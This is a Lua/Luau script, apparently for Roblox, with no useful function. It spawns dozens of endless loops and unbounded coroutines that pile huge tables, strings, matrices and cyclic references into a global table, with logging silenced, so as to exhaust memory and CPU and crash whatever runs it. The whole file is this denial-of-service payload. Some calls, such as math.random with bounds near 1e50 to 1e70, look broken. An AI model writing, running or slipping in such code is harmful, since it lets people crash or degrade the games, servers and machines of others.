local C={
    r=1e6,
    z=1e4,
    c=1e3,
    t=999999,
    max_k=1e4,
    debug=false,
    log_file=nil,
    start_time=os.clock(),
    max_memory=2048,
    max_cpu=100,
    log_interval=1,
    clean_on_exit=false,
    task_limit=1e5,
    task_delay=0.001,
    random_seed=os.time(),
    task_id=0,
    monitoring=false,
    auto_adjust=false,
    rate_limit=0,
    verbose=false,
    background_tasks=50,
    clean_interval=2
}
local R,T={},{}
local globalBullshit = {} -- Overgrown global table for maximum nonsense
local function debugLog(msg) end -- Silence debug logs
local function logToFile(msg) end -- Silence logs

-- Infinite pointless nested structures
task.spawn(function()
    while true do
        local function createInfiniteLoop(depth)
            if depth > 1e3 then
                return {randomNumber=math.random(1e50,1e60)}
            end
            local t = {}
            for i=1,10 do
                t[i] = createInfiniteLoop(depth+1)
            end
            -- Create cyclic reference to make it extra crazy
            t[11] = t
            return t
        end
        local crazyTable = createInfiniteLoop(1)
        table.insert(globalBullshit, crazyTable)
        -- Massive string spam
        local s = ("Nope"):rep(1e6)
        table.insert(globalBullshit, s)
        -- Random huge float
        local hugeFloat = math.random(1e50,1e60)
        table.insert(globalBullshit, hugeFloat)
        -- Massive sparse array with huge indices
        local sparse = {}
        for i=1,1e4 do
            local idx = math.random(1e20, 1e21)
            sparse[idx] = "bullshit"
        end
        table.insert(globalBullshit, sparse)
        -- Cyclic references to break the GC even more
        local a, b = {}, {}
        a.b = b
        b.a = a
        table.insert(globalBullshit, a)
        table.insert(globalBullshit, b)
        -- Infinite chain of tables referencing each other
        local chain1, chain2 = {}, {}
        chain1.next = chain2
        chain2.next = chain1
        table.insert(globalBullshit, chain1)
        table.insert(globalBullshit, chain2)
        collectgarbage("collect")
        task.wait(0.05)
    end
end)

-- Infinite spawning of pointless coroutines
task.spawn(function()
    local count = 0
    while true do
        for i=1,100 do
            task.spawn(function()
                while true do
                    -- Create a pointless big table
                    local t = {}
                    for j=1,1e4 do
                        t[j] = {rand=math.random(1e50,1e60), str=("bullshit"):rep(1024)}
                    end
                    -- Reference to itself
                    t.self = t
                    -- Store in global
                    table.insert(globalBullshit, t)
                    task.wait(0.01)
                end
            end)
            count = count + 1
        end
        if C.verbose then debugLog("Spawned pointless coroutines: " .. count) end
        task.wait(0.2)
    end
end)

-- Infinite creation of massive matrices with nonsense data
task.spawn(function()
    local mats = {}
    while true do
        local m = {}
        for i=1,1e3 do
            m[i] = {}
            for j=1,1e3 do
                m[i][j] = math.random(1e60,1e70)
            end
        end
        table.insert(globalBullshit, m)
        -- Keep only last 3 matrices
        if #mats >= 3 then for i=1,#mats do mats[i]=nil end end
        table.insert(mats, m)
        if C.verbose then debugLog("Created huge matrix with nonsense") end
        collectgarbage("collect")
        task.wait(0.1)
    end
end)

-- Infinite large byte arrays
task.spawn(function()
    local byteArrays = {}
    while true do
        local byteArray = {}
        for i=1,1e8 do
            byteArray[i] = math.random(0,255)
        end
        table.insert(globalBullshit, byteArray)
        if #byteArrays >= 5 then for i=1,#byteArrays do byteArrays[i]=nil end end
        table.insert(byteArrays, byteArray)
        if C.verbose then debugLog("Created massive byte array") end
        collectgarbage("collect")
        task.wait(0.3)
    end
end)

-- Infinite cyclic graphs with absurd complexity
task.spawn(function()
    local nodes = {}
    while true do
        local n1, n2 = {}, {}
        n1.next = n2
        n2.next = n1
        table.insert(globalBullshit, n1)
        table.insert(globalBullshit, n2)
        if #nodes >= 200 then for i=1,#nodes do nodes[i]=nil end end
        table.insert(nodes, n1)
        table.insert(nodes, n2)
        if C.verbose then debugLog("Created cyclic graph nodes") end
        collectgarbage("collect")
        task.wait(0.4)
    end
end)

-- Massive cyclic references
task.spawn(function()
    local cycleA, cycleB = {}, {}
    while true do
        cycleA.next = cycleB
        cycleB.next = cycleA
        cycleA.selfRef = cycleA
        cycleB.selfRef = cycleB
        table.insert(globalBullshit, cycleA)
        table.insert(globalBullshit, cycleB)
        if #globalBullshit > 1e4 then for i=1,#globalBullshit do globalBullshit[i]=nil end end
        if C.verbose then debugLog("Created massive cyclic references") end
        collectgarbage("collect")
        task.wait(0.5)
    end
end)

-- Infinite exponential number calculations (pointless)
task.spawn(function()
    local val = 1
    while true do
        val = val * math.random(1e10, 1e10+1)
        if val > 1e200 then val=1 end
        table.insert(globalBullshit, val)
        if C.verbose then debugLog("Huge exponential value") end
        task.wait(0.6)
    end
end)

-- Endless pointless string concatenations
task.spawn(function()
    local baseStr = ("NOPE"):rep(1024*1024)
    while true do
        local concatStr = baseStr .. baseStr .. baseStr
        table.insert(globalBullshit, concatStr)
        if C.verbose then debugLog("Massive string concatenation") end
        task.wait(0.7)
    end
end)

-- Infinite spawning of pointless nested tables with cyclic references
task.spawn(function()
    while true do
        local function createCyclicTable(level)
            if level > 500 then return {data="bullshit"} end
            local t = {}
            t.next = createCyclicTable(level+1)
            -- cyclic reference
            t.cycle = t
            return t
        end
        local t = createCyclicTable(1)
        table.insert(globalBullshit, t)
        if C.verbose then debugLog("Created cyclic nested table") end
        collectgarbage("collect")
        task.wait(0.4)
    end
end)

-- Infinite "resets" of large data with no cleanup
task.spawn(function()
    local dataCache = {}
    while true do
        for i=1,1e4 do
            local hugeStr = ("NOPE"):rep(1024*1024)
            local hugeTable = {}
            for j=1,1e4 do
                hugeTable[j] = {value=math.random(1e50,1e60), str=("bullshit"):rep(1024)}
            end
            dataCache[i] = hugeTable
        end
        -- Never clear dataCache, keep growing
        if C.verbose then debugLog("Huge data cache grew") end
        collectgarbage("collect")
        task.wait(0.5)
    end
end)

-- Infinite complex cyclic structures with odd references
task.spawn(function()
    while true do
        local a, b = {}, {}
        a.b = b
        b.a = a
        a.next = b
        b.next = a
        table.insert(globalBullshit, a)
        table.insert(globalBullshit, b)
        if #globalBullshit > 1e5 then for i=1,#globalBullshit do globalBullshit[i]=nil end end
        if C.verbose then debugLog("Created cyclic references") end
        collectgarbage("collect")
        task.wait(0.5)
    end
end)
